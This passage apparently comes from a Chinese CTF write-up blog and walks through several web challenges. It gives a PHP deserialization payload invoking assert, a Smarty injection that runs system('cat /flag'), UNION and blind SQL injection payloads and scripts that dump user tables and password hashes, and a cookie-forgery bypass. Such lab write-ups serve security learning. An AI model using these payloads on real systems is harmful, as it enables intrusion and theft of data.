</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span>(<span style=color:#a6e22e>isset</span>($_GET[<span style=color:#e6db74>&#39;source&#39;</span>]))
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>highlight_file</span>(<span style=color:#66d9ef>__FILE__</span>);
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>die</span>(<span style=color:#ae81ff>0</span>);
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>@</span>$ppp <span style=color:#f92672>=</span> <span style=color:#a6e22e>unserialize</span>($_GET[<span style=color:#e6db74>&#34;data&#34;</span>]); 
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>class</span> <span style=color:#a6e22e>HelloPhp</span>
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> $a <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;phpinfo()&#34;</span>;
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> $b <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;assert&#34;</span>;
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span><span style=color:#66d9ef>print</span>(<span style=color:#a6e22e>urlencode</span>(<span style=color:#a6e22e>serialize</span>(<span style=color:#66d9ef>new</span> <span style=color:#a6e22e>HelloPhp</span>())));
</span></span><span style=display:flex><span><span style=color:#75715e>?&gt;</span><span style=color:#960050;background-color:#1e0010>
</span></span></span></code></pre></div><p>flag在环境变量里：flag{66e902ae-7bf2-429a-bbbe-761cc9a02c94}</p><hr><h2 id=asis-2019unicorn-shop>[ASIS 2019]Unicorn shop<a hidden class=anchor aria-hidden=true href=#asis-2019unicorn-shop>#</a></h2><p>什么参数都不填会返回报错/charge：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#a6e22e>Traceback</span> (<span style=color:#a6e22e>most</span> <span style=color:#a6e22e>recent</span> <span style=color:#a6e22e>call</span> <span style=color:#a6e22e>last</span>)<span style=color:#f92672>:</span>
</span></span><span style=display:flex><span>  <span style=color:#a6e22e>File</span> <span style=color:#e6db74>&#34;/usr/local/lib/python2.7/site-packages/tornado/web.py&#34;</span>, <span style=color:#a6e22e>line</span> <span style=color:#ae81ff>1541</span>, <span style=color:#a6e22e>in</span> <span style=color:#a6e22e>_execute</span>
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>result</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>method</span>(<span style=color:#f92672>*</span><span style=color:#a6e22e>self</span><span style=color:#f92672>.</span><span style=color:#a6e22e>path_args</span>, <span style=color:#f92672>**</span><span style=color:#a6e22e>self</span><span style=color:#f92672>.</span><span style=color:#a6e22e>path_kwargs</span>)
</span></span><span style=display:flex><span>  <span style=color:#a6e22e>File</span> <span style=color:#e6db74>&#34;/app/sshop/views/Shop.py&#34;</span>, <span style=color:#a6e22e>line</span> <span style=color:#ae81ff>34</span>, <span style=color:#a6e22e>in</span> <span style=color:#a6e22e>post</span>
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>unicodedata</span><span style=color:#f92672>.</span><span style=color:#a6e22e>numeric</span>(<span style=color:#a6e22e>price</span>)
</span></span><span style=display:flex><span><span style=color:#a6e22e>TypeError</span><span style=color:#f92672>:</span> <span style=color:#a6e22e>need</span> <span style=color:#a6e22e>a</span> <span style=color:#a6e22e>single</span> <span style=color:#a6e22e>Unicode</span> <span style=color:#a6e22e>character</span> <span style=color:#66d9ef>as</span> <span style=color:#a6e22e>parameter</span>
</span></span></code></pre></div><p>尝试输入不同参数发现，只能买4，并且价格只能是一个字符，利用unicodedata.numeric可以将有数字意义的unicode字符转为浮点数：</p><pre tabindex=0><code>id=4&amp;price=万
</code></pre><p>flag{82b310d7-44b3-466f-8897-55aa2c15c5f5}</p><hr><h2 id=ciscn2019-华东南赛区web11>[CISCN2019 华东南赛区]Web11<a hidden class=anchor aria-hidden=true href=#ciscn2019-华东南赛区web11>#</a></h2><p>smarty模板注入，版本3.1.30：</p><pre tabindex=0><code>X-forwarded-for: {if system(&#39;cat /flag&#39;)}{/if}
</code></pre><p>flag{533b1d69-7c4a-4921-9441-bc3159114614}</p><hr><h2 id=bsidescf-2019kookie>[BSidesCF 2019]Kookie<a hidden class=anchor aria-hidden=true href=#bsidescf-2019kookie>#</a></h2><p>越权：</p><pre tabindex=0><code>Cookie: username=admin
</code></pre><p>flag{669d21db-c083-4b61-a91b-e5a16bf3221a}</p><hr><h2 id=swpu2019web1>[SWPU2019]Web1<a hidden class=anchor aria-hidden=true href=#swpu2019web1>#</a></h2><p>存在admin用户，随便注册一个test用户登录，发布广告存在XSS，广告详情是一个sql查询，应该是根据广告名进行的查询，单引号闭合发现报错，广告申请将<code># --</code>注释符以及<code>and or</code>过滤，考虑直接闭合引号，一共22列：</p><pre tabindex=0><code>-100&#39;/**/union/**/select/**/1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22/**/&#39;
</code></pre><p>注入点在2和3的位置，先查数据库名和用户权限：</p><pre tabindex=0><code>-100&#39;/**/union/**/select/**/1,database(),user(),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22/**/&#39;
web1 root@localhost
</code></pre><p>尝试load_file，读取register.php，login.php，addads.php和detail.php</p><p>register.php：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>include_once</span>(<span style=color:#e6db74>&#34;./config.php&#34;</span>);
</span></span><span style=display:flex><span><span style=color:#a6e22e>error_reporting</span>(<span style=color:#ae81ff>0</span>);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span>(<span style=color:#a6e22e>isset</span>($_POST[<span style=color:#e6db74>&#39;ac&#39;</span>])){
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>if</span>($_POST[<span style=color:#e6db74>&#39;ac&#39;</span>] <span style=color:#f92672>===</span> <span style=color:#e6db74>&#39;register&#39;</span>){
</span></span><span style=display:flex><span>		$username <span style=color:#f92672>=</span> <span style=color:#a6e22e>htmlspecialchars</span>(<span style=color:#a6e22e>addslashes</span>($_POST[<span style=color:#e6db74>&#39;username&#39;</span>]));
</span></span><span style=display:flex><span>		$password <span style=color:#f92672>=</span> <span style=color:#a6e22e>md5</span>($_POST[<span style=color:#e6db74>&#39;password&#39;</span>]);
</span></span><span style=display:flex><span>		<span style=color:#75715e>// echo $username;
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>		<span style=color:#75715e>// if(check($username)){
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>		<span style=color:#75715e>// 	die(&#34;Oh No! You are a hacker!! Not here!!!&lt;br&gt;&#34;);
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>		<span style=color:#75715e>// }
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>		<span style=color:#75715e>// echo $username;
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>		$sql_query <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;select * from users where name = &#39;</span><span style=color:#e6db74>$username</span><span style=color:#e6db74>&#39; limit 0,1&#34;</span>;
</span></span><span style=display:flex><span>		$sql_insert <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;insert into users (name, pass) values (&#39;</span><span style=color:#e6db74>$username</span><span style=color:#e6db74>&#39;,&#39;</span><span style=color:#e6db74>$password</span><span style=color:#e6db74>&#39;)&#34;</span>;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>		$result_query <span style=color:#f92672>=</span> $conn<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>query</span>($sql_query);
</span></span><span style=display:flex><span>		<span style=color:#66d9ef>if</span>($result_query<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>num_rows</span>){
</span></span><span style=display:flex><span>			<span style=color:#66d9ef>die</span>(<span style=color:#e6db74>&#34;&lt;font color=&#39;red&#39; size=&#39;4&#39;&gt;该用户已被注册&lt;/font&gt;&#34;</span>);
</span></span><span style=display:flex><span>		}<span style=color:#66d9ef>else</span>{
</span></span><span style=display:flex><span>			$result_insert <span style=color:#f92672>=</span> $conn<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>query</span>($sql_insert);
</span></span><span style=display:flex><span>			<span style=color:#66d9ef>if</span>($result_insert){
</span></span><span style=display:flex><span>				<span style=color:#a6e22e>header</span>(<span style=color:#e6db74>&#34;Location: login.php&#34;</span>);
</span></span><span style=display:flex><span>				<span style=color:#66d9ef>exit</span>();
</span></span><span style=display:flex><span>			}<span style=color:#66d9ef>else</span>{
</span></span><span style=display:flex><span>				<span style=color:#66d9ef>die</span>(<span style=color:#e6db74>&#34;&lt;font color=&#39;red&#39; size=&#39;4&#39;&gt;注册失败&lt;/font&gt;&#34;</span>);
</span></span><span style=display:flex><span>			}
</span></span><span style=display:flex><span>		}
</span></span><span style=display:flex><span>	}
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>$conn<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>close</span>();
</span></span><span style=display:flex><span><span style=color:#75715e>?&gt;</span><span style=color:#960050;background-color:#1e0010>
</span></span></span></code></pre></div><p>login.php</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span> <span style=color:#a6e22e>session_start</span>();
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>include_once</span>(<span style=color:#e6db74>&#39;./config.php&#39;</span>);
</span></span><span style=display:flex><span><span style=color:#a6e22e>error_reporting</span>(<span style=color:#ae81ff>0</span>);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span>(<span style=color:#a6e22e>isset</span>($_POST[<span style=color:#e6db74>&#39;ac&#39;</span>])){
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>if</span>($_POST[<span style=color:#e6db74>&#39;ac&#39;</span>] <span style=color:#f92672>===</span> <span style=color:#e6db74>&#39;login&#39;</span>){
</span></span><span style=display:flex><span>		$user <span style=color:#f92672>=</span> <span style=color:#a6e22e>htmlspecialchars</span>(<span style=color:#a6e22e>addslashes</span>($_POST[<span style=color:#e6db74>&#39;username&#39;</span>]));
</span></span><span style=display:flex><span>		$pass <span style=color:#f92672>=</span> <span style=color:#a6e22e>md5</span>($_POST[<span style=color:#e6db74>&#39;password&#39;</span>]);
</span></span><span style=display:flex><span>		$sql <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;select * from users where name = &#39;</span><span style=color:#e6db74>$user</span><span style=color:#e6db74>&#39; and pass = &#39;</span><span style=color:#e6db74>$pass</span><span style=color:#e6db74>&#39; limit 0,1&#34;</span>;
</span></span><span style=display:flex><span>		$result <span style=color:#f92672>=</span> $conn<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>query</span>($sql);
</span></span><span style=display:flex><span>		<span style=color:#66d9ef>if</span>($result<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>num_rows</span>){
</span></span><span style=display:flex><span>			$_SESSION[<span style=color:#e6db74>&#39;username&#39;</span>] <span style=color:#f92672>=</span> $user;
</span></span><span style=display:flex><span>			$_SESSION[<span style=color:#e6db74>&#39;islogin&#39;</span>] <span style=color:#f92672>=</span> <span style=color:#ae81ff>1</span>;
</span></span><span style=display:flex><span>			$_SESSION[<span style=color:#e6db74>&#39;number&#39;</span>] <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>;
</span></span><span style=display:flex><span>			<span style=color:#a6e22e>header</span>(<span style=color:#e6db74>&#34;Location: index.php&#34;</span>);
</span></span><span style=display:flex><span>			<span style=color:#66d9ef>exit</span>();
</span></span><span style=display:flex><span>		}<span style=color:#66d9ef>else</span>{
</span></span><span style=display:flex><span>			<span style=color:#66d9ef>die</span>(<span style=color:#e6db74>&#34;&lt;font color=&#39;red&#39; size=&#39;4&#39;&gt;登录失败&lt;/font&gt;&#34;</span>);
</span></span><span style=display:flex><span>		}
</span></span><span style=display:flex><span>	}
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>$conn<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>close</span>();
</span></span><span style=display:flex><span><span style=color:#75715e>?&gt;</span><span style=color:#960050;background-color:#1e0010>
</span></span></span></code></pre></div><p>addads.php：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>session_start</span>();
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span>(<span style=color:#f92672>!</span>$_SESSION[<span style=color:#e6db74>&#39;islogin&#39;</span>]){
</span></span><span style=display:flex><span>	<span style=color:#a6e22e>header</span>(<span style=color:#e6db74>&#34;Location: login.php&#34;</span>);
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>exit</span>();
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>include_once</span>(<span style=color:#e6db74>&#34;./config.php&#34;</span>);
</span></span><span style=display:flex><span><span style=color:#a6e22e>error_reporting</span>(<span style=color:#ae81ff>0</span>);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span>(<span style=color:#a6e22e>isset</span>($_POST[<span style=color:#e6db74>&#39;ac&#39;</span>])){
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>if</span>($_POST[<span style=color:#e6db74>&#39;ac&#39;</span>] <span style=color:#f92672>===</span> <span style=color:#e6db74>&#39;add&#39;</span>){
</span></span><span style=display:flex><span>		<span style=color:#66d9ef>if</span>($_SESSION[<span style=color:#e6db74>&#39;number&#39;</span>] <span style=color:#f92672>&gt;=</span> <span style=color:#ae81ff>10</span>)
</span></span><span style=display:flex><span>			<span style=color:#66d9ef>die</span>(<span style=color:#e6db74>&#34;&lt;font color=&#39;red&#39; size=&#39;4&#39;&gt;申请的广告条数已达上限，请先清理&lt;/font&gt;&#34;</span>);
</span></span><span style=display:flex><span>		$title <span style=color:#f92672>=</span> <span style=color:#a6e22e>filter</span>(<span style=color:#a6e22e>addslashes</span>($_POST[<span style=color:#e6db74>&#39;title&#39;</span>]));
</span></span><span style=display:flex><span>		$content <span style=color:#f92672>=</span> <span style=color:#a6e22e>addslashes</span>($_POST[<span style=color:#e6db74>&#39;content&#39;</span>]);
</span></span><span style=display:flex><span>		$sql_query <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;select * from ads where title = &#39;</span><span style=color:#e6db74>$title</span><span style=color:#e6db74>&#39; limit 0,1&#34;</span>;
</span></span><span style=display:flex><span>		$sql_insert <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;insert into ads (title, content, belong) values (&#39;</span><span style=color:#e6db74>$title</span><span style=color:#e6db74>&#39;, &#39;</span><span style=color:#e6db74>$content</span><span style=color:#e6db74>&#39;, &#39;&#34;</span><span style=color:#f92672>.</span><span style=color:#a6e22e>addslashes</span>($_SESSION[<span style=color:#e6db74>&#39;username&#39;</span>])<span style=color:#f92672>.</span><span style=color:#e6db74>&#34;&#39;)&#34;</span>;
</span></span><span style=display:flex><span>		<span style=color:#66d9ef>if</span>(<span style=color:#a6e22e>preg_match</span>(<span style=color:#e6db74>&#34;/updatexml|extractvalue|floor|name_const|join|exp|geometrycollection|multipoint|polygon|multipolygon|linestring|multilinestring|#|--|or|and/i&#34;</span>, $title))
</span></span><span style=display:flex><span>			<span style=color:#66d9ef>die</span>(<span style=color:#e6db74>&#34;&lt;font color=&#39;red&#39; size=&#39;4&#39;&gt;标题含有敏感词汇&lt;/font&gt;&#34;</span>);
</span></span><span style=display:flex><span>		$result_query <span style=color:#f92672>=</span> $conn<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>query</span>($sql_query);
</span></span><span style=display:flex><span>		<span style=color:#66d9ef>if</span>($result_query<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>num_rows</span>)
</span></span><span style=display:flex><span>			<span style=color:#66d9ef>die</span>(<span style=color:#e6db74>&#34;&lt;font color=&#39;red&#39; size=&#39;4&#39;&gt;广告名称已存在&lt;/font&gt;&#34;</span>);
</span></span><span style=display:flex><span>		<span style=color:#66d9ef>else</span>{
</span></span><span style=display:flex><span>			$result_insert <span style=color:#f92672>=</span> $conn<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>query</span>($sql_insert);
</span></span><span style=display:flex><span>			<span style=color:#66d9ef>if</span>($result_insert){
</span></span><span style=display:flex><span>				$_SESSION[<span style=color:#e6db74>&#39;number&#39;</span>] <span style=color:#f92672>+=</span> <span style=color:#ae81ff>1</span>;
</span></span><span style=display:flex><span>				<span style=color:#66d9ef>echo</span> <span style=color:#e6db74>&#34;&lt;script&gt;alert(&#39;已发送申请&#39;);window.location.href=&#39;index.php&#39;;&lt;/script&gt;&#34;</span>;
</span></span><span style=display:flex><span>				<span style=color:#66d9ef>exit</span>();
</span></span><span style=display:flex><span>			}<span style=color:#66d9ef>else</span>{
</span></span><span style=display:flex><span>				<span style=color:#66d9ef>die</span>(<span style=color:#e6db74>&#34;&lt;font color=&#39;red&#39; size=&#39;4&#39;&gt;申请失败&lt;/font&gt;&#34;</span>);
</span></span><span style=display:flex><span>			}
</span></span><span style=display:flex><span>		}
</span></span><span style=display:flex><span>	}
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>$conn<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>close</span>();
</span></span><span style=display:flex><span><span style=color:#75715e>?&gt;</span><span style=color:#960050;background-color:#1e0010>
</span></span></span></code></pre></div><p>detail.php：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>session_start</span>();
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span>(<span style=color:#f92672>!</span>$_SESSION[<span style=color:#e6db74>&#39;islogin&#39;</span>]){
</span></span><span style=display:flex><span>	<span style=color:#a6e22e>header</span>(<span style=color:#e6db74>&#34;Location: login.php&#34;</span>);
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>exit</span>();
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>include_once</span>(<span style=color:#e6db74>&#34;./config.php&#34;</span>);
</span></span><span style=display:flex><span><span style=color:#75715e>// error_reporting(0);
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
</span></span><span style=display:flex><span>$id <span style=color:#f92672>=</span> <span style=color:#a6e22e>intval</span>($_GET[<span style=color:#e6db74>&#39;id&#39;</span>]);
</span></span><span style=display:flex><span>$title <span style=color:#f92672>=</span> <span style=color:#a6e22e>htmlspecialchars_decode</span>($_SESSION[<span style=color:#e6db74>&#34;t&#34;</span><span style=color:#f92672>.</span>$id]);
</span></span><span style=display:flex><span>$sql <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;select * from ads where title = &#39;</span><span style=color:#e6db74>$title</span><span style=color:#e6db74>&#39; limit 0,1&#34;</span>;
</span></span><span style=display:flex><span>$result <span style=color:#f92672>=</span> $conn<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>query</span>($sql);
</span></span><span style=display:flex><span><span style=color:#f92672>@</span>$row <span style=color:#f92672>=</span> <span style=color:#a6e22e>mysqli_fetch_array</span>($result);
</span></span><span style=display:flex><span><span style=color:#66d9ef>echo</span> <span style=color:#e6db74>&lt;&lt;&lt;</span><span style=color:#e6db74>EOF</span><span style=color:#e6db74>
</span></span></span><span style=display:flex><span><span style=color:#e6db74>	&lt;div class=&#34;container&#34;&gt;
</span></span></span><span style=display:flex><span><span style=color:#e6db74>	&lt;h2&gt;广告详情&lt;/h2&gt;
</span></span></span><span style=display:flex><span><span style=color:#e6db74>	&lt;table class=&#34;table table-bordered&#34;&gt;
</span></span></span><span style=display:flex><span><span style=color:#e6db74>	&lt;thead&gt;
</span></span></span><span style=display:flex><span><span style=color:#e6db74>	&lt;tr&gt;
</span></span></span><span style=display:flex><span><span style=color:#e6db74>	&lt;th&gt;广告名&lt;/th&gt;
</span></span></span><span style=display:flex><span><span style=color:#e6db74>	&lt;th&gt;广告内容&lt;/th&gt;
</span></span></span><span style=display:flex><span><span style=color:#e6db74>	&lt;th&gt;状态&lt;/th&gt;
</span></span></span><span style=display:flex><span><span style=color:#e6db74>	&lt;/tr&gt;
</span></span></span><span style=display:flex><span><span style=color:#e6db74>	&lt;/thead&gt;
</span></span></span><span style=display:flex><span><span style=color:#e6db74>	&lt;tbody&gt;
</span></span></span><span style=display:flex><span><span style=color:#e6db74></span><span style=color:#e6db74>EOF</span>;
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span>($row){
</span></span><span style=display:flex><span>	$t <span style=color:#f92672>=</span> $row[<span style=color:#e6db74>&#39;title&#39;</span>];
</span></span><span style=display:flex><span>	$c <span style=color:#f92672>=</span> $row[<span style=color:#e6db74>&#39;content&#39;</span>];
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>echo</span> <span style=color:#e6db74>&#34;&lt;tr&gt;&lt;td&gt;&#34;</span><span style=color:#f92672>.</span>$t<span style=color:#f92672>.</span><span style=color:#e6db74>&#34;&lt;/td&gt;&lt;td&gt;&#34;</span><span style=color:#f92672>.</span>$c<span style=color:#f92672>.</span><span style=color:#e6db74>&#34;&lt;/td&gt;&lt;td&gt;待管理确认&lt;/td&gt;&lt;/tr&gt;&#34;</span>;
</span></span><span style=display:flex><span>}<span style=color:#66d9ef>else</span>{
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>echo</span> <span style=color:#e6db74>&#34;&lt;tr&gt;&lt;td colspan=&#39;2&#39;&gt;未查找到相关广告信息&lt;/td&gt;&lt;/tr&gt;&lt;br&gt;&#34;</span>;
</span></span><span style=display:flex><span>	<span style=color:#a6e22e>print_r</span>(<span style=color:#e6db74>&#34;&lt;font color=&#39;red&#39;&gt;&#34;</span><span style=color:#f92672>.</span><span style=color:#a6e22e>mysqli_error</span>($conn)<span style=color:#f92672>.</span><span style=color:#e6db74>&#34;&lt;/font&gt;&#34;</span>);
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>echo</span> <span style=color:#e6db74>&lt;&lt;&lt;</span><span style=color:#e6db74>ROR</span><span style=color:#e6db74>
</span></span></span><span style=display:flex><span><span style=color:#e6db74>	&lt;/tbody&gt;
</span></span></span><span style=display:flex><span><span style=color:#e6db74>	&lt;/table&gt;
</span></span></span><span style=display:flex><span><span style=color:#e6db74>	&lt;/div&gt;
</span></span></span><span style=display:flex><span><span style=color:#e6db74></span><span style=color:#e6db74>ROR</span>;
</span></span><span style=display:flex><span>$conn<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>close</span>();
</span></span><span style=display:flex><span><span style=color:#75715e>?&gt;</span><span style=color:#960050;background-color:#1e0010>
</span></span></span></code></pre></div><p>在register.php中发现所有信息存储在users表中，字段名为name和pass：</p><pre tabindex=0><code>-100&#39;/**/union/**/select/**/1,(select/**/group_concat(name,&#34;:&#34;,pass)/**/from/**/users),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22/**/&#39;

flag:flag{06462a15-5082-450e-91c9-838c2e6bee4d},admin:53e217ad4c721eb9565cf25a5ec3b66e,test:e10adc3949ba59abbe56e057f20f883e
</code></pre><hr><h2 id=bsidescf-2019futurella>[BSidesCF 2019]Futurella<a hidden class=anchor aria-hidden=true href=#bsidescf-2019futurella>#</a></h2><p>看网页源码：flag{81fc69c0-d693-4042-9a9a-821ab2037cf8}</p><hr><h2 id=极客大挑战-2019finalsql>[极客大挑战 2019]FinalSQL<a hidden class=anchor aria-hidden=true href=#极客大挑战-2019finalsql>#</a></h2><p>fuzz一下，登陆页面常规的符号如<code>'空格#()--</code>和关键字如<code>and or</code>都被过滤了，考虑注入search.php的id参数</p><p>同样fuzz一下，单双引号都报error，猜测是数字型闭合，过滤了空格，同时报错无错误回显，尝试盲注</p><p>查表名：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>import</span> requests
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> string
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>url <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;http://3c2999f1-f7fe-4fe4-9594-2c35c1d93268.node5.buuoj.cn:81/search.php&#34;</span>
</span></span><span style=display:flex><span>chars <span style=color:#f92672>=</span> string<span style=color:#f92672>.</span>ascii_lowercase <span style=color:#f92672>+</span> string<span style=color:#f92672>.</span>ascii_uppercase <span style=color:#f92672>+</span> string<span style=color:#f92672>.</span>digits
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>tableName <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;&#34;</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>for</span> i <span style=color:#f92672>in</span> range(<span style=color:#ae81ff>1</span>,<span style=color:#ae81ff>10</span>):
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>for</span> c <span style=color:#f92672>in</span> chars:
</span></span><span style=display:flex><span>        payload <span style=color:#f92672>=</span> <span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;0^(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),</span><span style=color:#e6db74>{</span>i<span style=color:#e6db74>}</span><span style=color:#e6db74>,1))=</span><span style=color:#e6db74>{</span>ord(c)<span style=color:#e6db74>}</span><span style=color:#e6db74>)&#34;</span>
</span></span><span style=display:flex><span>        params <span style=color:#f92672>=</span> {<span style=color:#e6db74>&#34;id&#34;</span>: payload}
</span></span><span style=display:flex><span>        resp <span style=color:#f92672>=</span> requests<span style=color:#f92672>.</span>get(url, params<span style=color:#f92672>=</span>params)
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> <span style=color:#e6db74>&#34;Click others&#34;</span> <span style=color:#f92672>in</span> resp<span style=color:#f92672>.</span>text:
</span></span><span style=display:flex><span>            <span style=color:#75715e>#print(c)</span>
</span></span><span style=display:flex><span>            tableName <span style=color:#f92672>+=</span> c
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>break</span>
</span></span><span style=display:flex><span>print(tableName)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># F1naI1y</span>
</span></span></code></pre></div><p>查字段名：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span>columnName <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;&#34;</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>for</span> i <span style=color:#f92672>in</span> range(<span style=color:#ae81ff>1</span>,<span style=color:#ae81ff>20</span>):
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>for</span> c <span style=color:#f92672>in</span> chars:
</span></span><span style=display:flex><span>        payload <span style=color:#f92672>=</span> <span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;0^(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name=&#39;F1naI1y&#39;)),</span><span style=color:#e6db74>{</span>i<span style=color:#e6db74>}</span><span style=color:#e6db74>,1))=</span><span style=color:#e6db74>{</span>ord(c)<span style=color:#e6db74>}</span><span style=color:#e6db74>)&#34;</span>
</span></span><span style=display:flex><span>        params <span style=color:#f92672>=</span> {<span style=color:#e6db74>&#34;id&#34;</span>: payload}
</span></span><span style=display:flex><span>        resp <span style=color:#f92672>=</span> requests<span style=color:#f92672>.</span>get(url, params<span style=color:#f92672>=</span>params)
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> <span style=color:#e6db74>&#34;Click others&#34;</span> <span style=color:#f92672>in</span> resp<span style=color:#f92672>.</span>text:
</span></span><span style=display:flex><span>            print(c)
</span></span><span style=display:flex><span>            columnName <span style=color:#f92672>+=</span> c
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>break</span>
</span></span><span style=display:flex><span>print(columnName)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># id username password</span>
